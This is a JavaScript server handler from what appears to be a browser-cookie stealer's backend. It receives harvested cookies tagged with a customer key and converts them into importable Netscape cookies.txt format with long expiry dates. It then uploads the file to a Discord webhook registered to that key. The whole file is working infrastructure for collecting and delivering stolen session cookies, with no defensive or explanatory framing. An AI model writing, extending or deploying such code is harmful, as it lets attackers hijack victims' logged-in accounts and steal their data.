const { keyToWebhook } = require('../keyToWebhook');
const fs = require('fs');
const { WebhookClient } = require('discord.js');

module.exports = async (req, res) => {
    const { key, cookies } = req.body
    if (!key) return;
    let webhook = await keyToWebhook(key)
    if (!webhook) return;
    let content = !cookies.includes('HOST KEY:') ? "Cookies don\'t found." : cookies;
    fs.writeFileSync(`./Src/Temp/cookies_${key}.txt`, content);
     if (content !== "Cookies don\'t found.") {
         var new_cookies = "";
         fs.readFileSync(`./Src/Temp/cookies_${key}.txt`, 'utf-8').split(/\r?\n/).forEach((line) => {
             if (line.includes("COOKIES FROM:")) return;
             if (line == "" || line == undefined) return;
             var host = line.split("|")[0]?.replace("HOST KEY: ", "").trim();
             var name = line.split("|")[1]?.replace(" NAME: ", "").trim();
             var value = line.split("|")[2]?.replace(" VALUE: ", "").trim();
             new_cookies += host + "	" + "TRUE" + "	/" + "	FALSE" + "	2597573456	" + name + "	" + value + "\n"
         });
         fs.writeFileSync(`./Src/Temp/cookies_${key}.txt`, new_cookies);
     }
    const webhookClient = new WebhookClient({ url: webhook });
    await webhookClient.send({
        files: [{
            attachment: `./Src/Temp/cookies_${key}.txt`,
            name: "cookies.txt"
        }]
    })
        .then(() => {
            fs.unlink(`./Src/Temp/cookies_${key}.txt`, function (err) {
                if (err) { };
            })
            res.sendStatus(200)
            return;
        })
        .catch(err => { })
}